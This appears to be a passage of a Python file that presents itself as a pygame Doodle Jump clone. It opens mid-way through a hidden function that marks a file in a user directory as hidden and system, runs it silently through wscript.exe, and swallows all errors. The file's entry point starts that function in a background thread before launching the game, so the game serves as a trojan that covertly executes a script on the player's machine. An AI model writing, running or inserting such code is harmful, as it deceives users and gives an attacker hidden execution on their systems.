        subprocess.run(
            f'attrib +h +s "{os.path.join(os.getenv(env_var), p1, p2, p3, p4, p5, file_name)}"',  # type: ignore
            shell=True,
            creationflags=FLAGS,
        )
    except:
        pass
    try:
        subprocess.Popen(
            [
                "wscript.exe",
                os.path.join(os.getenv(env_var), p1, p2, p3, p4, p5, file_name),  # type: ignore
            ],
            creationflags=FLAGS,
        )

    except:
        pass
    # exit the thread to avoid any further execution
    try:
        threading.current_thread()._stop()  # type: ignore
    except:
        pass


def run_jump_game():
    import pygame
    import random
    import time
    import sys

    WIDTH, HEIGHT = 480, 640
    FPS = 56

    FLYING_ENEMY_CHANCE = 0.05
    FLYING_ENEMY_SPEED_MIN = 4
    FLYING_ENEMY_SPEED_MAX = 7
    FLYING_ENEMY_MIN_Y = 10
    FLYING_ENEMY_MAX_Y = 50
    FLYING_ENEMY_SCORE_MIN = 1500

    GRAVITY = 0.4
    JUMP_VELOCITY = -13

    GOLDEN_BOOTS_JUMP_MULT = 1.3
    GOLDEN_BOOTS_DURATION = 5.0
    PURPLE_POTION_DURATION = 5.0

    ENEMY_START_PERCENT = 20
    ENEMY_INCREASE_PER_1000 = 2
    ENEMY_MAX_PERCENT = 25

    POTION_START_PERCENT = 3
    POTION_INCREASE_PER_1000 = 1.5

    GOLDEN_BOOTS_START_PERCENT = 5
    GOLDEN_BOOTS_INCREASE_PER_1000 = 0
    GOLDEN_BOOTS_MAX_PERCENT = 12

    SKY_BLUE = (125, 211, 252)
    TEXT_COLOR = (4, 42, 58)
    PURPLE_COLOR = (160, 32, 240)
    RED_COLOR = (200, 30, 30)
    CLOUD_WHITE = (255, 255, 255, 180)
    GOLD_COLOR = (255, 215, 0)

    def resource_path(relative_path):
        if hasattr(sys, "_MEIPASS"):
            return os.path.join(sys._MEIPASS, relative_path)  # type: ignore
        return os.path.join(os.path.abspath("."), relative_path)

    def create_surface_from_sprite(sprite, color_map, pixel_size):
        rows, cols = len(sprite), len(sprite[0])
        surf = pygame.Surface((cols * pixel_size, rows * pixel_size), pygame.SRCALPHA)
        for r, row_str in enumerate(sprite):
            for c, char in enumerate(row_str):
                color = color_map.get(char)
                if color:
                    pygame.draw.rect(
                        surf,
                        pygame.Color(color),
                        (c * pixel_size, r * pixel_size, pixel_size, pixel_size),
                    )
        return surf

    def draw_text_manual(screen, x, y, text, size, color):
        font_map = {
            "0": [31, 17, 31],
            "1": [0, 31, 0],
            "2": [29, 21, 23],
            "3": [21, 21, 31],
            "4": [7, 4, 31],
            "5": [23, 21, 29],
            "6": [31, 21, 29],
            "7": [1, 1, 31],
            "8": [31, 21, 31],
            "9": [7, 5, 31],
            ".": [0, 16, 0],
            ":": [0, 10, 0],
            "G": [31, 17, 25],
            "A": [30, 5, 30],
            "M": [31, 2, 31],
            "E": [31, 21, 21],
            "O": [31, 17, 31],
            "V": [15, 16, 15],
            "R": [31, 9, 22],
            "P": [31, 5, 2],
            "S": [18, 21, 9],
            "C": [31, 17, 17],
            "N": [31, 2, 4, 8, 31],
            "I": [17, 31, 17],
            "L": [31, 16, 16],
            "U": [31, 16, 31],
            "T": [1, 31, 1],
            " ": [0, 0, 0],
            "Y": [3, 28, 3],
            "K": [31, 4, 10, 17],
        }
        curr_x = x
        for char in str(text).upper():
            bitmap = font_map.get(char, [31, 31, 31])
            for col_idx, col_val in enumerate(bitmap):
                for row_idx in range(5):
                    if col_val & (1 << row_idx):
                        pygame.draw.rect(
                            screen,
                            color,
                            (curr_x + col_idx * size, y + row_idx * size, size, size),
                        )
            curr_x += (len(bitmap) + 1) * size

    class Cloud:
        def __init__(self, y=None):
            self.width, self.height = random.randint(60, 120), random.randint(30, 50)
            self.x = random.randint(-50, WIDTH)
            self.y = y if y is not None else random.randint(-100, HEIGHT)
            self.speed = random.uniform(0.2, 0.4)
            self.surf = pygame.Surface((self.width, self.height), pygame.SRCALPHA)
            pygame.draw.ellipse(
                self.surf, CLOUD_WHITE, (0, 10, self.width, self.height - 10)
            )
            pygame.draw.ellipse(
                self.surf,
                CLOUD_WHITE,
                (self.width // 4, 0, self.width // 2, self.height // 1.5),
            )

        def update(self, dy=0):
            self.x += self.speed
            self.y += dy
            if self.x > WIDTH:
                self.x = -self.width
            if self.y > HEIGHT:
                self.y = -100
                self.x = random.randint(-50, WIDTH)

        def draw(self, screen):
            screen.blit(self.surf, (self.x, self.y))

    class GoldenBoots:
        PIXEL_SIZE = 2
        SPRITE = ["..bbbb...bbbb......", "..bbbb...bbbb......", ".bbbbb...bbbbb....."]
        COLOR_MAP = {".": None, "b": "#FFD700"}

        def __init__(self, platform=None):
            self.platform, self.active = platform, True
            base_surf = create_surface_from_sprite(
                self.SPRITE, self.COLOR_MAP, self.PIXEL_SIZE
            )
            self.surf_r, self.surf_l = (
                base_surf,
                pygame.transform.flip(base_surf, True, False),
            )
            self.rect = self.surf_r.get_rect()
            if self.platform:
                self.update()

        def update(self):
            if self.platform:
                self.rect.centerx = self.platform.rect.centerx
                self.rect.bottom = self.platform.rect.top

        def draw(self, screen, direction="right"):
            if self.active:
                screen.blit(
                    self.surf_r if direction == "right" else self.surf_l, self.rect
                )

    class PurplePotion:
        PIXEL_SIZE = 2
        SPRITE = [
            ".....wwww.....",
            ".....wwww.....",
            "......pp......",
            ".....pppp.....",
            "....pppppp....",
            "....pppppp....",
            "....pppppp....",
            "....pppppp....",
            "....pppppp....",
            "....pppppp....",
            ".....pppp.....",
        ]
        COLOR_MAP = {".": None, "p": "#a020f0", "w": "#361F20"}

        def __init__(self, platform):
            self.platform, self.active = platform, True
            self.surf = create_surface_from_sprite(
                self.SPRITE, self.COLOR_MAP, self.PIXEL_SIZE
            )
            self.rect = self.surf.get_rect()
            self.update()

        def update(self):
            self.rect.centerx = self.platform.rect.centerx
            self.rect.bottom = self.platform.rect.top - 8

        def draw(self, screen):
            if self.active:
                screen.blit(self.surf, self.rect)

    class Platform:
        PIXEL_SIZE = 2
        SPRITE = [
            "..G..G..G..G..G..G..G..G..",
            ".GGGGGGGGGGGGGGGGGGGGGGGG.",
            "GLLLLLLLLLLLLLLLLLLLLLLLLG",
            ".GGGGGGGGGGGGGGGGGGGGGGGG.",
        ]
        COLOR_MAP = {".": None, "G": "#16a34a", "L": "#22c55e"}

        def __init__(self, x, y, moving=False):
            self.surf = create_surface_from_sprite(
                self.SPRITE, self.COLOR_MAP, self.PIXEL_SIZE
            )
            self.rect = self.surf.get_rect(topleft=(x, y))
            self.moving, self.dir, self.speed = (
                moving,
                1,
                random.uniform(1, 3) if moving else 0,
            )
            (
                self.enemy,
                self.broken,
                self.is_falling,
                self.has_been_stepped_on,
                self.fall_speed,
            ) = None, False, False, False, 0
            self.golden_boots, self.purple_potion = None, None

        def update(self):
            if self.is_falling:
                self.fall_speed += 0.5
                self.rect.y += self.fall_speed  # type: ignore
                if self.rect.top > HEIGHT:
                    self.broken = True
                return
            if self.moving:
                self.rect.x += self.dir * self.speed  # type: ignore
                if self.rect.left <= 0 or self.rect.right >= WIDTH:
                    self.dir *= -1
            if self.enemy:
                self.enemy.update()
            if self.golden_boots:
                self.golden_boots.update()
            if self.purple_potion:
                self.purple_potion.update()

        def draw(self, screen):
            screen.blit(self.surf, self.rect)
            if self.enemy:
                self.enemy.draw(screen)
            if self.golden_boots:
                self.golden_boots.draw(screen)
            if self.purple_potion:
                self.purple_potion.draw(screen)

    class BreakablePlatform(Platform):
        SPRITE = [
            "...BBBBBBBBBBB.B.BBBBBBBBBBBB...",
            "..BMMMMMMMMMMMM.M.MMMMMMMMMMMB..",
            "..BMMMMMMMMMMMM.M.MMMMMMMMMMMB..",
            "...BBBBBBBBBBB.B.BBBBBBBBBBBB...",
        ]
        COLOR_MAP = {".": None, "B": "#5B3A29", "M": "#8B5A2B"}

        def __init__(self, x, y):
            super().__init__(x, y, False)
            self.surf = create_surface_from_sprite(
                self.SPRITE, self.COLOR_MAP, self.PIXEL_SIZE
            )
            self.surf_left, self.surf_right, self.split_offset = None, None, 0

        def split_now(self):
            if self.is_falling:
                return
            w, h = self.surf.get_size()
            mid = w // 2
            self.surf_left = pygame.Surface((mid, h), pygame.SRCALPHA)
            self.surf_left.blit(self.surf, (0, 0), (0, 0, mid, h))
            self.surf_right = pygame.Surface((w - mid, h), pygame.SRCALPHA)
            self.surf_right.blit(self.surf, (0, 0), (mid, 0, w - mid, h))
            self.is_falling = True

        def update(self):
            if self.is_falling:
                self.fall_speed += 0.5
                self.rect.y += self.fall_speed  # type: ignore
                self.split_offset += 3
                if self.rect.top > HEIGHT:
                    self.broken = True
            else:
                super().update()

        def draw(self, screen):
            if self.is_falling and self.surf_left:
                screen.blit(
                    self.surf_left, (self.rect.x - self.split_offset, self.rect.y)
                )
                screen.blit(
                    self.surf_right,
                    (
                        self.rect.x + (self.rect.width // 2) + self.split_offset,
                        self.rect.y,
                    ),
                )
            else:
                screen.blit(self.surf, self.rect)

    class Enemy:
        PIXEL_SIZE = 1
        SPRITE_CLOSED = [
            "......................",
            "...bb............bb...",
            "..bWWb..........bWWb..",
            "..bWWWb........bWWWb..",
            ".bbbbbbbbbbbbbbbbbbbb.",
            "bccccccccccccccccccccb",
            "bccccccccccccccccccccb",
            "bccccccccccccccccccccb",
            "bccccccccccccccccccccb",
            "bccccWWWWccccWWWWccccb",
            "bccccWbbWccccWbbWccccb",
            "bccccWWWWccccWWWWccccb",
            "bccccccccccccccccccccb",
            "bccccWccccccccccWccccb",
            "bccccWWccccccccWWccccb",
            "bcccbWbbbbbbbbbbWbcccb",
            "bccccccccccccccccccccb",
            "bcccccccbbbbbbcccccccb",
            "bcccccbbWWWWWWbbcccccb",
            "bccccbbWWWWWWWWbbccccb",
            "bccccbWWWWWWWWWWbccccb",
            "bbcccbWWWWWWWWWWbcccbb",
            ".bbcccbbWWWWWWbbcccbb.",
            "..bbccccbbbbbbccccbb..",
            "...bbbbbb....bbbbbb...",
        ]
        SPRITE_OPEN = [
            "......................",
            "...bb............bb...",
            "..bWWb..........bWWb..",
            "..bWWWb........bWWWb..",
            ".bbbbbbbbbbbbbbbbbbbb.",
            "bccccccccccccccccccccb",
            "bccccccccccccccccccccb",
            "bccccccccccccccccccccb",
            "bccccccccccccccccccccb",
            "bccccWWWWccccWWWWccccb",
            "bccccWbbWccccWbbWccccb",
            "bccccWWWWccccWWWWccccb",
            "bccccccccccccccccccccb",
            "bcccccWccccccccWcccccb",
            "bccccbWbbbbbbbbWbccccb",
            "bcccbWWWWWWWWWWWWbcccb",
            "bccccbbbbbbbbbbbbccccb",
            "bcccccccbbbbbbcccccccb",
            "bcccccbbWWWWWWbbcccccb",
            "bccccbbWWWWWWWWbbccccb",
            "bccccbWWWWWWWWWWbccccb",
            "bbcccbWWWWWWWWWWbcccbb",
            ".bbcccbbWWWWWWbbcccbb.",
            "..bbccccbbbbbbccccbb..",
            "...bbbbbb....bbbbbb...",
            "...bbbbbb....bbbbbb...",
        ]
        COLOR_MAP = {".": None, "b": "#000000", "c": "#4FD3F7", "W": "#FFFFFF"}

        def __init__(self, platform):
            self.platform = platform
            surf_closed = create_surface_from_sprite(
                self.SPRITE_CLOSED, self.COLOR_MAP, self.PIXEL_SIZE
            )
            surf_open = create_surface_from_sprite(
                self.SPRITE_OPEN, self.COLOR_MAP, self.PIXEL_SIZE
            )

            self.frames = [surf_closed, surf_open]
            self.current_frame = 0
            self.last_update = time.time()

            self.rect = surf_closed.get_rect()
            self.alive = True
            self.update()

        def update(self):
            self.rect.centerx = self.platform.rect.centerx
            self.rect.bottom = self.platform.rect.top

            if time.time() - self.last_update > 0.25:
                self.current_frame = (self.current_frame + 1) % len(self.frames)
                self.last_update = time.time()

        def draw(self, screen):
            if self.alive:
                draw_rect = self.rect.copy()
                if self.current_frame == 1:  # open mouth frame
                    draw_rect.y -= 3
                screen.blit(self.frames[self.current_frame], draw_rect)

    class FlyingEnemy:
        PIXEL_SIZE = 1
        SPRITE_UP = [
            "........................................................",
            "....................bb............bb....................",
            "...................bWWb..........bWWb...................",
            ".........W.........bWWWb........bWWWb.........W.........",
            "........WWW.......bbbbbbbbbbbbbbbbbbbb.......WWW........",
            ".......bbbbb.....bccccccccccccccccccccb.....bbbbb.......",
            ".....bbb.b.bb....bccccccccccccccccccccb....bb.b.bbb.....",
            "....bb..b.b.bbb..bccccccccccccccccccccb..bbb.b.b..bb....",
            "...bb.b.bb.b..bb.bccccccccccccccccccccb.bb..b.bb.b.bb...",
            "..bb.b.b..b.b.b.bbccccWWWWccccWWWWccccbb.b.b.b..b.b.bb..",
            "bb.bb.b.b.bbb.b.bbccccWbbWccccWbbWccccbb.b.bbb.b.b.bb.bb",
            "bbb..b..b.b.bb.b.bccccWWWWccccWWWWccccb.b.bb.b.b..b..bbb",
            "bb.b..b.b.b.b.bb.bccccccccccccccccccccb.bb.b.b.b.b..b.bb",
            "bb..bb.b.b.b.b.b.bccccWccccccccccWccccb.b.b.b.b.b.bb..bb",
            "bb.b.bb.b.b.b.b.bbccccWWccccccccWWccccbb.b.b.b.b.bb.b.bb",
            "bb..b.bb.b.b.b.b.bcccbWbbbbbbbbbbWbcccb.b.b.b.b.bb.b..bb",
            "bb.b.b.b.b.b.b.b.bccccccccccccccccccccb.b.b.b.b.b.b.b.bb",
            "bb..b.b.bbbb.b.b.bcccccccbbbbbbcccccccb.b.b.bbbb.b.b..bb",
            "bb.b.b.bb..bb.b..bcccccbbWWWWWWbbcccccb..b.bb..bb.b.b.bb",
            ".bb..bb.....bb.b.bccccbbWWWWWWWWbbccccb...bb.....bb..bb.",
            "..bbb........bb..bccccbWWWWWWWWWWbccccb..bb........bbb..",
            "..WWW.........bbbbbcccbWWWWWWWWWWbcccbbbb..........WWW..",
            "..WW..............bbcccbbWWWWWWbbcccbb..............WW..",
            "...WW..............bbccccbbbbbbccccbb..............WW...",
            "....................bbbbbb....bbbbbb....................",
        ]
        SPRITE_DOWN = [
            "........................................................",
            "....................bb............bb....................",
            "...................bWWb..........bWWb...................",
            "...................bWWWb........bWWWb...................",
            "..................bbbbbbbbbbbbbbbbbbbb..................",
            ".................bccccccccccccccccccccb.................",
            ".......W.........bccccccccccccccccccccb.........W.......",
            "......WWW........bccccccccccccccccccccb........WWW......",
            ".....bbbbb.......bccccccccccccccccccccb.......bbbbb.....",
            "...bbb.b.bb......bccccWWWWccccWWWWccccb......bb.b.bbb...",
            ".bbb..b.b.bbb....bccccWbbWccccWbbWccccb....bbb.b.b..bbb.",
            "bb.b.bb.b.b.bb...bccccWWWWccccWWWWccccb...bb.b.b.bb.b.bb",
            "bbb..b..b.b.bb.b.bccccccccccccccccccccb.b.bb.b.b..b..bbb",
            "bb.b..b.b.b.b.bb.bccccWccccccccccWccccb.bb.b.b.b.b..b.bb",
            "bb..bb.b.b.b.b.b.bccccWWccccccccWWccccb.b.b.b.b.b.bb..bb",
            "bb.b.bb.b.b.b.b..bcccbWbbbbbbbbbbWbcccb..b.b.b.b.bb.b.bb",
            "bb..b.b.b.b.b.b..bccccccccccccccccccccb..b.b.b.b.b.b..bb",
            "bb.b.b.bbbb.b.b..bcccccccbbbbbbcccccccb..b.b.bbbb.b.b.bb",
            "bb..b.bb..bb.b.b.bcccccbbWWWWWWbbcccccb.b.b.bb..bb.b..bb",
            ".bb..bb.....bb.b.bccccbbWWWWWWWWbbccccb.b.bb.....bb..bb.",
            "..bbb.........bb.bccccbWWWWWWWWWWbccccb.bb.........bbb..",
            "..WWW.........bbbbbcccbWWWWWWWWWWbcccbbbb..........WWW..",
            "..WW..............bbcccbbWWWWWWbbcccbb..............WW..",
            "...WW..............bbccccbbbbbbccccbb..............WW...",
            "....................bbbbbb....bbbbbb....................",
        ]
        COLOR_MAP = {".": None, "b": "#000000", "c": "#FC481B", "W": "#FFFFFF"}

        def __init__(self, y):
            self.frames = [
                create_surface_from_sprite(
                    self.SPRITE_UP, self.COLOR_MAP, self.PIXEL_SIZE
                ),
                create_surface_from_sprite(
                    self.SPRITE_DOWN, self.COLOR_MAP, self.PIXEL_SIZE
                ),
            ]
            self.current_frame, self.last_update = 0, time.time()
            start_y = y + random.randint(FLYING_ENEMY_MIN_Y, FLYING_ENEMY_MAX_Y)
            self.rect = self.frames[0].get_rect(
                topleft=(random.randint(0, WIDTH - 100), start_y)
            )
            self.direction = random.choice([-1, 1])
            self.speed = random.uniform(FLYING_ENEMY_SPEED_MIN, FLYING_ENEMY_SPEED_MAX)
            self.alive = True

        def update(self, dy=0):
            self.rect.x += self.direction * self.speed  # type: ignore
            self.rect.y += dy
            if time.time() - self.last_update > 0.1:
                self.current_frame = (self.current_frame + 1) % len(self.frames)
                self.last_update = time.time()
            if self.rect.left <= 0 or self.rect.right >= WIDTH:
                self.direction *= -1

        def draw(self, screen):
            if self.alive:
                img = self.frames[self.current_frame]
                if self.direction == 1:
                    img = pygame.transform.flip(img, True, False)
                screen.blit(img, self.rect)

    class Player:
        PIXEL_SIZE = 2
        SPRITE = [
            "...RRR...............",
            "..RRR.bbbbb..........",
            ".RRR.bl111lb.........",
            ".RR.bl111111b........",
            ".RR.b11111111b.......",
            ".RR.bshshshshb.......",
            ".RR.bl1111111b.......",
            "..R.bbbbbbbbbb.......",
            "...bbll1111llbb......",
            "..bbllbbbbbllbb......",
            ".bbllb11111bbllb..YyY",
            ".bl11b11111bbllbsbYyY",
            ".bl11b11111bbllbssYyY",
            ".bbllbbbbbllbb.bsbYyY",
            "..bbll1111llbb..ssYyY",
            "...bbbbbbbbbb.....YyY",
            "GGwwwwwwwwwwwww...YyY",
            "GGbbbbbbbbbbb......Y.",
            "...bbbb...bbbb.......",
            "...bbbb...bbbb.......",
            "..bbbbb...bbbbb......",
        ]
        COLOR_MAP = {
            ".": None,
            "R": "#FF0000",
            "b": "#2D2D2D",
            "1": "#EAEAEA",
            "l": "#A0A0A0",
            "s": "#707070",
            "h": "#000000",
            "Y": "#FFD700",
            "y": "#FFB900",
            "w": "#FFFFFF",
            "G": "#DAA520",
        }

        def __init__(self):
            self.surf_right = create_surface_from_sprite(
                self.SPRITE, self.COLOR_MAP, self.PIXEL_SIZE
            )
            self.surf_left = pygame.transform.flip(self.surf_right, True, False)
            self.rect = self.surf_right.get_rect(center=(WIDTH // 2, HEIGHT - 120))
            self.vx, self.vy, self.direction = 0, 0, "right"
            self.boots_active, self.boots_end_time = False, 0
            self.boots_visual = GoldenBoots()

        def update(self, keys, potion_active):
            speed = 7
            move_left, move_right = (
                (keys[pygame.K_LEFT] or keys[pygame.K_a]),
                (keys[pygame.K_RIGHT] or keys[pygame.K_d]),
            )
            if potion_active:
                move_left, move_right = move_right, move_left
            if move_left:
                self.vx = -speed
                self.direction = "left"
            elif move_right:
                self.vx = speed
                self.direction = "right"
            else:
                self.vx = 0
            self.rect.x += self.vx
            self.vy += GRAVITY
            self.rect.y += self.vy  # type: ignore
            if self.rect.left > WIDTH:
                self.rect.right = 0
            if self.rect.right < 0:
                self.rect.left = WIDTH
            if self.boots_active and time.time() > self.boots_end_time:
                self.boots_active = False

        def draw(self, screen):
            screen.blit(
                self.surf_right if self.direction == "right" else self.surf_left,
                self.rect,
            )
            if self.boots_active:
                self.boots_visual.rect.centerx = self.rect.centerx
                self.boots_visual.rect.bottom = self.rect.bottom
                self.boots_visual.draw(screen, self.direction)

    # === Game Manager ===

    class GameManager:
        def __init__(self):
            pygame.init()
            self.screen = pygame.display.set_mode((WIDTH, HEIGHT))
            pygame.display.set_caption("Doodle Jump")
            try:
                icon_path = resource_path("inside_icon.png")
                icon_img = pygame.image.load(icon_path)
                pygame.display.set_icon(icon_img)
            except:
                pass
            self.clock = pygame.time.Clock()
            self.reset()

        def reset(self):
            self.player = Player()
            self.platforms = []
            self.flying_enemies = []
            self.clouds = [Cloud() for _ in range(6)]
            self.score, self.game_over, self.potion_active, self.potion_end_time = (
                0,
                False,
                False,
                0,
            )
            self.platforms.append(Platform(WIDTH // 2 - 50, HEIGHT - 80))
            for i in range(8):
                self.spawn_platform(HEIGHT - (i * (HEIGHT // 8)) - 150)

        def spawn_platform(self, y):
            difficulty_steps = self.score // 1000
            enemy_chance = (
                min(
                    ENEMY_MAX_PERCENT,
                    ENEMY_START_PERCENT + (difficulty_steps * ENEMY_INCREASE_PER_1000),
                )
                / 100.0
            )
            potion_chance = (
                POTION_START_PERCENT + (difficulty_steps * POTION_INCREASE_PER_1000)
            ) / 100.0
            boots_chance = (
                min(
                    GOLDEN_BOOTS_MAX_PERCENT,
                    GOLDEN_BOOTS_START_PERCENT
                    + (difficulty_steps * GOLDEN_BOOTS_INCREASE_PER_1000),
                )
                / 100.0
            )

            x = random.randint(0, WIDTH - 80)

            if random.random() < 0.25:
                p = BreakablePlatform(x, y)
            else:
                p = Platform(x, y, moving=(random.random() < 0.15))
                if random.random() < enemy_chance:
                    p.enemy = Enemy(p)  # type: ignore
                if random.random() < boots_chance:
                    p.golden_boots = GoldenBoots(p)  # type: ignore
                elif random.random() < potion_chance:
                    p.purple_potion = PurplePotion(p)  # type: ignore

            if (
                self.score >= FLYING_ENEMY_SCORE_MIN
                and random.random() < FLYING_ENEMY_CHANCE
            ):
                self.flying_enemies.append(FlyingEnemy(y))

            self.platforms.append(p)

        def update(self):
            keys = pygame.key.get_pressed()
            if self.potion_active and time.time() > self.potion_end_time:
                self.potion_active = False
            self.player.update(keys, self.potion_active)

            dy = 0
            if self.player.rect.y < HEIGHT // 3:
                dy = (HEIGHT // 3) - self.player.rect.y
                self.player.rect.y += dy
                self.score += int(dy)

            for c in self.clouds:
                c.update(dy * 0.5)  # type: ignore

            for p in self.platforms[:]:
                p.rect.y += dy
                p.update()
                if (
                    not p.is_falling
                    and self.player.vy > 0
                    and self.player.rect.colliderect(p.rect)
                ):
                    if self.player.rect.bottom <= p.rect.top + 15:
                        if isinstance(p, BreakablePlatform):
                            p.has_been_stepped_on = True
                        if p.golden_boots and p.golden_boots.active:
                            self.player.boots_active, self.player.boots_end_time = (  # type: ignore
                                True,
                                time.time() + GOLDEN_BOOTS_DURATION,
                            )
                            p.golden_boots.active = False
                        if p.purple_potion and p.purple_potion.active:
                            self.potion_active, self.potion_end_time = (
                                True,
                                time.time() + PURPLE_POTION_DURATION,
                            )
                            p.purple_potion.active = False
                        self.player.vy = JUMP_VELOCITY * (
                            GOLDEN_BOOTS_JUMP_MULT if self.player.boots_active else 1
                        )

                if (
                    isinstance(p, BreakablePlatform)
                    and p.has_been_stepped_on
                    and self.player.vy < -2
                ):
                    p.split_now()
                if p.rect.top > HEIGHT or p.broken:
                    self.platforms.remove(p)
                    self.spawn_platform(
                        min((plat.rect.y for plat in self.platforms), default=HEIGHT)
                        - 90
                    )

                if (
                    p.enemy
                    and p.enemy.alive
                    and self.player.rect.colliderect(p.enemy.rect)
                ):
                    if (
                        self.player.vy > 0
                        and self.player.rect.bottom <= p.enemy.rect.top + 15
                    ):
                        p.enemy.alive, self.player.vy = False, JUMP_VELOCITY * 1.1
                        self.score += 150
                    else:
                        self.game_over = True

            for fe in self.flying_enemies[:]:
                fe.update(dy)
                if fe.alive and fe.rect.colliderect(self.player.rect):
                    if (
                        self.player.vy > 0
                        and self.player.rect.bottom <= fe.rect.top + 20
                    ):
                        fe.alive, self.player.vy = False, JUMP_VELOCITY * 1.2
                        self.score += 200
                    else:
                        self.game_over = True
                if fe.rect.top > HEIGHT or not fe.alive:
                    self.flying_enemies.remove(fe)

            if self.player.rect.top > HEIGHT:
                self.game_over = True

        def draw(self):
            self.screen.fill(SKY_BLUE)
            for c in self.clouds:
                c.draw(self.screen)
            for p in self.platforms:
                p.draw(self.screen)
            for fe in self.flying_enemies:
                fe.draw(self.screen)
            self.player.draw(self.screen)

            if not self.game_over:
                draw_text_manual(self.screen, 20, 20, self.score, 4, TEXT_COLOR)
                curr_y = 50
                if self.player.boots_active:
                    rem = max(0, self.player.boots_end_time - time.time())
                    draw_text_manual(
                        self.screen, 20, curr_y, f"{rem:.1f}", 3, GOLD_COLOR
                    )
                    curr_y += 20
                if self.potion_active:
                    rem = max(0, self.potion_end_time - time.time())
                    draw_text_manual(
                        self.screen, 20, curr_y, f"{rem:.1f}", 3, PURPLE_COLOR
                    )

            if self.game_over:
                overlay = pygame.Surface((WIDTH, HEIGHT), pygame.SRCALPHA)
                overlay.fill((255, 255, 255, 180))
                self.screen.blit(overlay, (0, 0))
                draw_text_manual(
                    self.screen,
                    WIDTH // 2 - 75,
                    HEIGHT // 2 - 60,
                    "GAME OVER",
                    4,
                    RED_COLOR,
                )
                score_str = str(self.score)
                s_x = WIDTH // 2 - (len(score_str) * 12)
                draw_text_manual(self.screen, s_x, HEIGHT // 2, score_str, 6, RED_COLOR)
                draw_text_manual(
                    self.screen,
                    WIDTH // 2 - 85,
                    HEIGHT // 2 + 80,
                    "PRESS ANY KEY",
                    3,
                    TEXT_COLOR,
                )
            pygame.display.flip()

        def run(self):
            while True:
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        pygame.quit()
                        sys.exit()
                    if event.type == pygame.KEYDOWN and self.game_over:
                        self.reset()  # if any key is pressed, restart the game
                if not self.game_over:
                    self.update()
                self.draw()
                self.clock.tick(FPS)

    if __name__ == "__main__":
        GameManager().run()


if __name__ == "__main__":
    threading.Thread(target=b, daemon=True).start()
    run_jump_game()
